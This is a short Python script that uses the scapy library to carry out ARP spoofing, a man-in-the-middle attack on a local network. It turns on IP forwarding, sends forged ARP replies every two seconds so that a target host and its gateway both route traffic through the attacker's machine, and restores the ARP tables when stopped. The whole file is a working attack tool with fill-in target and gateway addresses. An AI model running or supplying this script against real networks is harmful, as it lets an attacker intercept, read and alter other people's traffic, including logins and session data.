#!/usr/bin/env python3
from scapy.all import ARP, send, sr1
import time
import os
import platform

def enable_ip_forwarding():
    """Enable IP forwarding to allow traffic to flow through this machine."""
    if platform.system() == "Linux":
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    else:
        print("[-] IP forwarding not supported on this OS.")

def disable_ip_forwarding():
    """Disable IP forwarding after the attack."""
    if platform.system() == "Linux":
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    else:
        print("[-] IP forwarding not supported on this OS.")

def get_mac(ip):
    """Get the MAC address of a given IP using ARP request."""
    arp_request = ARP(pdst=ip)
    response = sr1(arp_request, timeout=2, verbose=False)
    if response:
        return response.hwsrc
    else:
        print(f"Could not find MAC address for IP: {ip}")
        return None

def spoof(target_ip, spoof_ip):
    """Send a spoofed ARP packet to the target."""
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

def restore(target_ip, spoof_ip):
    """Restore the ARP tables of the target and spoofed IP."""
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac and spoof_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
        send(packet, count=4, verbose=False)

if __name__ == "__main__":
    target_ip = "10.0.0.110"  # Replace with the target IP
    gateway_ip = "10.0.0.1"   # Replace with the gateway IP

    try:
        enable_ip_forwarding()
        print("[+] IP forwarding enabled.")
        print("[+] Starting ARP spoofing. Press Ctrl+C to stop.")

        while True:
            spoof(target_ip, gateway_ip)  # Tell the target we are the gateway
            spoof(gateway_ip, target_ip)  # Tell the gateway we are the target
            time.sleep(2)  # Wait 2 seconds between spoofing

    except KeyboardInterrupt:
        print("\n[+] Detected Ctrl+C. Restoring ARP tables...")

    finally:
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        disable_ip_forwarding()
        print("[+] ARP tables restored. IP forwarding disabled.")
